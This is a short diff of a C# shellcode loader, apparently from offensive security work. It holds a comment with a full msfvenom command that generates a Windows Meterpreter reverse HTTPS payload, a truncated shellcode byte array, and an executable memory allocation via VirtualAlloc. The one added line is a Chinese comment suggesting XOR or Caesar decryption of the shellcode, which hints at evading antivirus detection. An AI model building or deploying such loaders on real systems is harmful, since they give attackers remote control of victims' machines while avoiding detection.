@@ -38,6 +38,8 @@ public class TestClass
         // sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=XXX LPORT=443 EXITFUNC=thread -f csharp | tr -d '\n'
         byte[] buf = new byte[612] { 0xfc, 0x48, 0x83, 0xe4 ... };
 
+        // 这里可以添加 Caesar 或 XOR 对应 Shellcode 解密代码
+
         int size = buf.Length;
 
         IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
